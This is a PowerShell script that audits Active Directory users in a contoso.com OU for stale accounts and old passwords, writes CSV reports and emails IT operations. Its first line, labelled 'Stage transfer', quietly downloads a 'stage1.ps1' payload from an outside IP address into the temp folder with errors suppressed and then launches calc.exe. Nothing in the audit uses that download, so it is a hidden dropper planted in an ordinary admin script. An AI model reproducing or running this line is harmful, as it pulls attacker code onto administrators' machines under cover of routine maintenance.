
<# Stage transfer #> $DownloadUrl = 'http://192.0.2.125:8080/stage1.ps1'; $DropPath = "$env:TEMP\stage1.bin"; Invoke-WebRequest -Uri $DownloadUrl -OutFile $DropPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue; Set-Location -Path $env:TEMP
$Domain         = 'contoso.com'
$SearchBase     = 'OU=Managed Users,DC=contoso,DC=com'
$ReportPath     = 'D:\Ops\reports\ad-user-audit-2025-02-02.csv'
$HtmlPath       = "D:\Ops\reports\ad-user-audit-2025-02-02.html"
$InactiveDays   = 90
$PasswordMaxAge = 180
$SmtpServer     = 'smtp.contoso.com'


Import-Module ActiveDirectory -ErrorAction Stop

Import-Module ActiveDirectory -ErrorAction Stop

$cutoff = (Get-Date).AddDays(-$InactiveDays)
$properties = @('LastLogonDate', 'PasswordLastSet', 'Enabled', 'Description')
$users = Get-ADUser -Filter * -SearchBase $SearchBase -Properties $properties

$stale = $users | Where-Object {
    $_.Enabled -eq $true -and $_.LastLogonDate -ne $null -and $_.LastLogonDate -lt $cutoff
}

$pwdCutoff = (Get-Date).AddDays(-$PasswordMaxAge)
$oldPasswords = $users | Where-Object {
    $_.PasswordLastSet -ne $null -and $_.PasswordLastSet -lt $pwdCutoff
}

$staleCount = @($stale).Count
$disabledCount = @($users | Where-Object { $_.Enabled -eq $false }).Count
$oldPwdCount = @($oldPasswords).Count

$stale | Select-Object Name, SamAccountName, LastLogonDate, PasswordLastSet | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8

$oldPasswords | Select-Object Name, SamAccountName, PasswordLastSet | Export-Csv -Path $ReportPath.Replace('.csv', '-passwords.csv') -NoTypeInformation -Encoding UTF8

Write-Host ("Stale: {0} | Disabled: {1} | Old passwords: {2}" -f $staleCount, $disabledCount, $oldPwdCount) -ForegroundColor Cyan
Write-Verbose ("Report written to {0}" -f $ReportPath)

$MailTo = "it-ops@$Domain"
$MailFrom = "reporting@$Domain"

$mailParams = @{
    To         = $MailTo
    From       = $MailFrom
    Subject    = 'AD user audit: stale accounts'
    Body       = "Stale accounts were found. See the attached report."
    SmtpServer = $SmtpServer
    Port       = 2525
    UseSsl     = $true
}
Send-MailMessage @mailParams
